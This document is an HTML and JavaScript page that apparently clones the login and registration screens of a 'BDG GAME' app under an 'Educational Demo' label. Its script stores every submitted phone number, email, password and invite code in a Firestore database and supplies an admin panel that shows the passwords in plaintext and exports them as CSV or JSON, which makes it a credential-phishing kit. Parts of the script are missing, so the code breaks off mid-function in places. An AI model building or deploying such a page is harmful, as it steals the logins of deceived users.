<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#2b2b2b" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <meta name="description" content="BDG GAME - Educational Demo" />
  <title>BDG GAME</title>
  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800;900&display=swap" rel="stylesheet" />
  <style>
    /* ========== RESET / BASE ========== */
    *, *::before, *::after { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    html, body {
      margin: 0; padding: 0; min-height: 100%;
      background: #2b2b2b; color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
      overscroll-behavior: none;
    }
    input, button, textarea, select { font-family: inherit; }
    button { border: 0; background: transparent; cursor: pointer; color: inherit; }
    input {
      color: #fff; font-size: 16px;
      border: 0; outline: 0; background: transparent;
    }
    input::placeholder { color: rgba(255,255,255,0.35); }
    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus {
      -webkit-text-fill-color: #fff;
      -webkit-box-shadow: 0 0 0 1000px #3a3a3a inset;
      transition: background-color 5000s ease-in-out 0s;
      caret-color: #fff;
    }
    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }
    ::-webkit-scrollbar-track { background: transparent; }

    .screen {
      max-width: 440px;
      margin: 0 auto;
      min-height: 100dvh;
      display: flex; flex-direction: column;
      background: #2b2b2b;
    }

    /* ========== HEADER ========== */
    .header {
      position: relative;
      display: flex; align-items: center; justify-content: space-between;
      background: #3a3a3a;
      padding: 12px;
    }
    .icon-btn {
      width: 40px; height: 40px;
      display: inline-flex; align-items: center; justify-content: center;
      color: rgba(255,255,255,0.92);
    }
    .icon-btn:active { opacity: 0.6; }
    .header-logo {
      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
      pointer-events: none;
    }
    .logo-wrap { display: flex; flex-direction: column; align-items: center; }
    .logo-text {
      font-family: "Cinzel", "Times New Roman", serif;
      font-weight: 900; font-size: 22px; letter-spacing: 2px;
      color: #e0b64a; line-height: 1;
      text-shadow: 0 1px 0 rgba(0,0,0,0.55);
    }
    .logo-bar1 { margin-top: 3px; height: 2px; width: 128px; background: #e0b64a; }
    .logo-bar2 { margin-top: 2px; height: 1px; width: 110px; background: rgba(224,182,74,0.85); }

    .lang { display: flex; align-items: center; gap: 6px; padding-right: 4px; }
    .flag {
      position: relative; width: 22px; height: 22px; overflow: hidden;
      border-radius: 50%; border: 1px solid rgba(255,255,255,0.3);
      background: repeating-linear-gradient(180deg, #b22234 0 2.5px, #fff 2.5px 4.7px);
    }
    .flag::before {
      content: ""; position: absolute; left: 0; top: 0;
      width: 45%; height: 52%; background: #3c3b6e;
      background-image: radial-gradient(circle, white 0.4px, transparent 0.5px);
      background-size: 3px 3px;
    }
    .lang-text { font-size: 15px; font-weight: 600; color: #e0b64a; }

    /* ========== INTRO ========== */
    .intro { background: #3a3a3a; padding: 4px 20px 24px; }
    .intro-title { font-size: 24px; font-weight: 700; color: #fff; margin: 0; }
    .intro-text { font-size: 13px; line-height: 1.55; color: rgba(255,255,255,0.85); margin: 12px 0 0; }

    /* ========== TABS (login) ========== */
    .tabs {
      display: grid; grid-template-columns: 1fr 1fr;
      border-bottom: 1px solid rgba(255,255,255,0.1);
      padding-top: 16px; background: #2b2b2b;
    }
    .tab {
      position: relative;
      display: flex; flex-direction: column; align-items: center;
      gap: 6px; padding: 0 0 8px;
    }
    .tab-icons { display: flex; align-items: center; gap: 4px; }
    .tab-label { font-size: 15px; color: rgba(255,255,255,0.7); }
    .tab.active .tab-label { color: #e0b64a; font-weight: 600; }
    .tab-underline {
      position: absolute; bottom: 0; height: 2px; width: 75%; background: transparent;
    }
    .tab.active .tab-underline { background: #e0b64a; }

    /* ========== FORM ========== */
    .form { padding: 24px 20px 0; flex: 1; }
    .field-label { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
    .field-label span { font-size: 15px; color: #fff; }
    .field {
      display: flex; align-items: center;
      height: 46px; border-radius: 6px; background: #3a3a3a;
      padding: 0 12px; margin-bottom: 24px;
    }
    .field input { width: 100%; height: 100%; min-width: 0; }
    .field-row { display: flex; gap: 12px; margin-bottom: 24px; }
    .cc-select {
      display: flex; align-items: center; justify-content: space-between;
      height: 46px; min-width: 86px; border-radius: 6px;
      background: #3a3a3a; padding: 0 12px; color: #fff; font-size: 15px;
    }
    .cc-select svg { margin-left: 4px; }
    .field-row .field { flex: 1; min-width: 0; margin-bottom: 0; }
    .eye-btn { padding-left: 8px; color: rgba(255,255,255,0.85); display: inline-flex; align-items: center; }

    /* ========== SECTION TITLE (register) ========== */
    .section-head { display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
    .section-head-title { margin-top: 8px; font-size: 17px; font-weight: 700; color: #e0b64a; letter-spacing: 0.6px; }
    .section-head-bar { margin-top: 12px; height: 2px; width: 92%; background: #e0b64a; }

    /* ========== CHECKBOX ========== */
    .check-row { display: flex; align-items: center; gap: 12px; margin-bottom: 28px; }
    .check-btn {
      width: 22px; height: 22px; border-radius: 50%;
      border: 2px solid rgba(255,255,255,0.45); background: transparent;
      display: inline-flex; align-items: center; justify-content: center;
      transition: all 0.15s; padding: 0; flex-shrink: 0;
    }
    .check-btn.checked { border-color: #d4a53a; background: #d4a53a; }
    .check-btn svg { display: none; }
    .check-btn.checked svg { display: block; }
    .check-label { font-size: 14px; color: rgba(255,255,255,0.9); line-height: 1.35; }
    .check-label .privacy { color: #ef4444; }

    /* ========== BUTTONS ========== */
    .btn-primary {
      display: block; width: 100%; height: 46px;
      border-radius: 9999px; font-size: 17px; font-weight: 600;
      background: linear-gradient(180deg, #f4d47a, #c99a3f);
      color: #5a3d10;
      box-shadow: 0 3px 6px rgba(0,0,0,0.25);
      margin-bottom: 16px;
      transition: transform 0.05s, opacity 0.15s;
    }
    .btn-primary:active { transform: scale(0.99); opacity: 0.9; }
    .btn-primary.disabled {
      background: #8b8fa0; color: rgba(255,255,255,0.7);
      box-shadow: none; cursor: not-allowed;
    }
    .btn-outline {
      display: block; width: 100%; height: 46px;
      border-radius: 9999px; font-size: 16px; font-weight: 600; letter-spacing: 2px;
      border: 1px solid #e0b64a; color: #e0b64a; background: transparent;
    }
    .btn-outline.plain { letter-spacing: 0; font-weight: 400; font-size: 15px; color: #fff; }
    .btn-outline.plain b { color: #e0b64a; font-weight: 600; letter-spacing: 2px; }
    .btn-outline:active { opacity: 0.7; }

    /* ========== BOTTOM ICONS ========== */
    .bottom-links {
      display: grid; grid-template-columns: 1fr 1fr; gap: 24px;
      margin-top: 32px; padding-bottom: 24px;
    }
    .bl-item { display: flex; flex-direction: column; align-items: center; gap: 6px; }
    .bl-label { font-size: 14px; color: rgba(255,255,255,0.9); }

    /* ========== EDU DISCLAIMER ========== */
    .disclaimer {
      margin: 8px 0 16px;
      padding: 8px 12px;
      border: 1px solid rgba(255,255,255,0.1);
      background: rgba(255,255,255,0.03);
      border-radius: 6px;
      font-size: 10px; line-height: 1.5;
      color: rgba(255,255,255,0.4);
    }

    /* ========== ADMIN ========== */
    .admin-body { min-height: 100dvh; background: #0f1420; color: #fff; }
    .admin-topbar {
      position: sticky; top: 0; z-index: 10;
      background: rgba(20,26,43,0.95);
      backdrop-filter: blur(6px);
      border-bottom: 1px solid rgba(255,255,255,0.1);
      padding-top: env(safe-area-inset-top);
    }
    .admin-inner { max-width: 1200px; margin: 0 auto; padding: 0 12px; }
    @media (min-width: 640px) { .admin-inner { padding: 0 16px; } }
    .admin-topbar .row { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; }
    .admin-brand { display: flex; align-items: center; gap: 10px; }
    .admin-badge {
      width: 36px; height: 36px; border-radius: 8px;
      background: linear-gradient(135deg, #fbbf24, #d97706);
      display: inline-flex; align-items: center; justify-content: center;
      color: #3a2a05; font-weight: 900;
    }
    .admin-title { font-size: 15px; font-weight: 700; line-height: 1.15; }
    .admin-sub { font-size: 11px; color: rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px;}
    .conn-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: #6b7280; display: inline-block;
    }
    .conn-dot.ok { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
    .conn-dot.err { background: #ef4444; }
    .btn-danger {
      background: rgba(220,38,38,0.85); padding: 6px 12px;
      border-radius: 6px; font-size: 14px; font-weight: 500;
    }
    .btn-danger:hover { background: rgb(220,38,38); }

    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding-top: 16px; }
    @media (min-width: 640px) { .stats { gap: 12px; } }
    .stat { padding: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.15); }
    @media (min-width: 640px) { .stat { padding: 16px; } }
    .stat.blue { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
    .stat.green { background: linear-gradient(135deg, #10b981, #047857); }
    .stat.amber { background: linear-gradient(135deg, #f59e0b, #b45309); }
    .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.8); }
    @media (min-width: 640px) { .stat-label { font-size: 12px; } }
    .stat-value { margin-top: 4px; font-size: 20px; font-weight: 900; }
    @media (min-width: 640px) { .stat-value { font-size: 24px; } }

    .controls { margin-top: 16px; display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
    .controls input, .controls select {
      background: #1c2338; border: 1px solid rgba(255,255,255,0.1);
      padding: 8px 12px; border-radius: 6px; font-size: 14px; color: #fff;
    }
    .controls input { flex: 1; min-width: 0; flex-basis: 220px; }
    .btn-sm { padding: 8px 12px; border-radius: 6px; font-size: 14px; font-weight: 500; }
    .btn-blue { background: #2563eb; } .btn-blue:hover { background: #3b82f6; }
    .btn-green { background: #059669; } .btn-green:hover { background: #10b981; }
    .btn-green-dark { background: #047857; } .btn-green-dark:hover { background: #059669; }
    .btn-red { background: #dc2626; } .btn-red:hover { background: #ef4444; }
    .btn-white { background: rgba(255,255,255,0.1); } .btn-white:hover { background: rgba(255,255,255,0.2); }

    .cards { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
    @media (min-width: 768px) { .cards { display: none; } }
    .card {
      background: #1c2338; border: 1px solid rgba(255,255,255,0.1);
      border-radius: 8px; padding: 12px;
    }
    .card-head { display: flex; align-items: center; justify-content: space-between; }
    .card-head-left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    .num { font-size: 12px; color: rgba(255,255,255,0.5); }
    .badge {
      padding: 2px 8px; border-radius: 4px;
      font-size: 11px; font-weight: 600; text-transform: uppercase;
    }
    .badge.login { background: rgba(16,185,129,0.3); color: #6ee7b7; }
    .badge.register { background: rgba(217,119,6,0.3); color: #fcd34d; }
    .badge.pending { background: rgba(107,114,128,0.3); color: #d1d5db; }
    .badge.saved   { background: rgba(34,197,94,0.25); color: #86efac; }
    .mini-copy {
      background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px;
      font-size: 11px;
    }
    .mini-copy:hover { background: rgba(255,255,255,0.2); }
    .card-body { margin-top: 8px; display: flex; flex-direction: column; gap: 6px; font-size: 13px; }
    .row-line { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
    .row-line .label { flex-shrink: 0; color: rgba(255,255,255,0.5); }
    .row-line .val { min-width: 0; text-align: right; word-break: break-all; color: #fff; }
    .row-line .val.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
    .row-line .val.hl { color: #fde047; }

    .table-wrap { margin-top: 16px; display: none; }
    @media (min-width: 768px) { .table-wrap { display: block; } }
    .table-scroll { overflow-x: auto; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; }
    table { width: 100%; min-width: 900px; border-collapse: collapse; font-size: 14px; }
    thead { background: #1c2338; color: rgba(255,255,255,0.8); text-align: left; }
    th, td { padding: 12px; }
    tbody tr { border-top: 1px solid rgba(255,255,255,0.05); }
    tbody tr:hover { background: rgba(255,255,255,0.03); }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
    .text-white50 { color: rgba(255,255,255,0.5); }
    .text-white60 { color: rgba(255,255,255,0.6); }
    .text-white70 { color: rgba(255,255,255,0.7); }
    .text-white80 { color: rgba(255,255,255,0.8); }
    .text-yellow { color: #fde047; }
    .truncate { max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .nowrap { white-space: nowrap; }
    .empty {
      padding: 24px; text-align: center; color: rgba(255,255,255,0.5); font-size: 14px;
      border: 1px dashed rgba(255,255,255,0.15);
      background: rgba(255,255,255,0.02);
      border-radius: 8px;
    }
    .note { margin: 16px 0 24px; font-size: 12px; color: rgba(255,255,255,0.4); }
    .note code { background: rgba(255,255,255,0.08); padding: 1px 6px; border-radius: 4px; }
    .toast {
      position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
      background: rgba(0,0,0,0.85); color: #fff;
      padding: 10px 16px; border-radius: 8px; font-size: 13px;
      z-index: 9999; opacity: 0; transition: opacity 0.25s;
      pointer-events: none; max-width: 90vw; text-align: center;
    }
    .toast.show { opacity: 1; }
  </style>
</head>

    let dbStatus = { ok: false, err: null };

    /**
     * saveCapture — always writes to Firestore.
     * With persistent local cache, the write is instantly saved to
     * IndexedDB and then synced to the Firebase cloud in background —
     * even if the user is redirected right after clicking the button.
     */
    async function saveCapture(entry) {
      const document = Object.assign({}, entry, {
        userAgent: navigator.userAgent,
        clientTime: Date.now(),
        createdAt: serverTimestamp()
      });
      Object.keys(document).forEach(k => document[k] === undefined && delete document[k]);
      try {
        // Fire-and-forget: local write is synchronous inside SDK,
        // cloud upload happens automatically in the background.
        addDoc(collection(db, COLLECTION), document)
          .then(() => { dbStatus = { ok: true, err: null }; })
          .catch(err => { dbStatus = { ok: false, err: err.message || String(err) }; });
        return true;
      } catch (e) {
        dbStatus = { ok: false, err: e.message || String(e) };
        return false;
      }
    }

    let liveUsers = [];
    let liveUnsub = null;
    function subscribeLive(cb) {
      unsubscribeLive();
      try {
        const q = query(collection(db, COLLECTION), orderBy("clientTime", "desc"));
        liveUnsub = onSnapshot(q,
          { includeMetadataChanges: true },
          (snap) => {
            liveUsers = snap.docs.map(d => Object.assign(
              { _id: d.id, _pending: d.metadata.hasPendingWrites, _fromCache: d.metadata.fromCache },
              d.data()
            ));
            dbStatus = { ok: !snap.metadata.fromCache, err: null };
            cb && cb(liveUsers);
          },
          (err) => {
            dbStatus = { ok: false, err: err.message || String(err) };
            cb && cb(liveUsers);
          }
        );
      } catch (e) {
        dbStatus = { ok: false, err: e.message || String(e) };
      }
    }
    function unsubscribeLive() {
      if (liveUnsub) { try { liveUnsub(); } catch {} liveUnsub = null; }
    }

    async function clearAll() {
      try {
        const snap = await getDocs(collection(db, COLLECTION));
        let batch = writeBatch(db); let count = 0;
        for (const d of snap.docs) {
          batch.delete(doc(db, COLLECTION, d.id));
          count++;
          if (count % 400 === 0) { await batch.commit(); batch = writeBatch(db); }
        }
        await batch.commit();
        return true;
      } catch (e) { alert("Delete failed: " + (e.message || e)); return false; }
    }

        : `<span class="badge saved">saved</span>`;
      return `
        <div class="card">
          <div class="card-head">
            <div class="card-head-left">
              <span class="num">#${idx}</span>
              <span class="badge ${u.type}">${u.type}</span>
              <span class="num">${escapeHTML(u.mode || "")}</span>
              ${sync}
            </div>
            <button class="mini-copy" type="button" data-copy="${escapeHTML(copyStr)}">Copy</button>
          </div>
          <div class="card-body">
            <div class="row-line"><span class="label">Phone / Email</span><span class="val mono">${escapeHTML(idText || "-")}</span></div>
            <div class="row-line"><span class="label">Password</span><span class="val mono hl">${escapeHTML(reveal ? (u.password || "-") : mask(u.password))}</span></div>
            ${u.confirmPassword ? `<div class="row-line"><span class="label">Confirm</span><span class="val mono">${escapeHTML(reveal ? u.confirmPassword : mask(u.confirmPassword))}</span></div>` : ""}
            ${u.inviteCode ? `<div class="row-line"><span class="label">Invite</span><span class="val mono">${escapeHTML(u.inviteCode)}</span></div>` : ""}
            <div class="row-line"><span class="label">Time</span><span class="val">${escapeHTML(fmtTime(u))}</span></div>
          </div>
        </div>
      `;
    }

    function rowHTML(u, idx, reveal) {
      const idText = u.mode === "email" ? (u.email || "") : `${u.countryCode || ""} ${u.phone || ""}`.trim();
      const sync = u._pending
        ? `<span class="badge pending">syncing</span>`
        : `<span class="badge saved">saved</span>`;
      return `
        <tr>
          <td class="text-white60">${idx}</td>
          <td class="nowrap text-white80">${escapeHTML(fmtTime(u))}</td>
          <td><span class="badge ${u.type}">${u.type}</span></td>
          <td class="text-white80">${escapeHTML(u.mode || "-")}</td>
          <td class="mono">${escapeHTML(idText || "-")}</td>
          <td class="mono text-yellow">${escapeHTML(reveal ? (u.password || "-") : mask(u.password))}</td>
          <td class="mono text-white70">${escapeHTML(reveal ? (u.confirmPassword || "-") : mask(u.confirmPassword))}</td>
          <td class="mono text-white70">${escapeHTML(u.inviteCode || "-")}</td>
          <td>${sync}</td>
          <td class="truncate text-white50" title="${escapeHTML(u.userAgent || "")}">${escapeHTML(u.userAgent || "")}</td>
        </tr>
      `;
    }

    function download(blob, filename) {
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url; a.download = filename; a.click();
      URL.revokeObjectURL(url);
    }
    function exportJSON() {
      download(new Blob([JSON.stringify(adminState.users, null, 2)], { type: "application/json" }),
        `bdg-users-${Date.now()}.json`);
    }
    function exportCSV() {
      const users = adminState.users;
      const headers = ["_id","type","mode","countryCode","phone","email","password","confirmPassword","inviteCode","clientTime","date","userAgent"];
      const rows = users.map(u => [
        u._id, u.type, u.mode || "", u.countryCode || "", u.phone || "", u.email || "",
        u.password || "", u.confirmPassword || "", u.inviteCode || "",
        String(u.clientTime || ""), new Date(timeStamp(u)).toISOString(),
        (u.userAgent || "").replace(/,/g, ";")
      ]);
      const csv = headers.join(",") + "\n" +
        rows.map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
      download(new Blob([csv], { type: "text/csv" }), `bdg-users-${Date.now()}.csv`);
    }

    /* ============ INIT ============ */
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", render);
    } else {
      render();
    }
  </script>
</body>
</html>
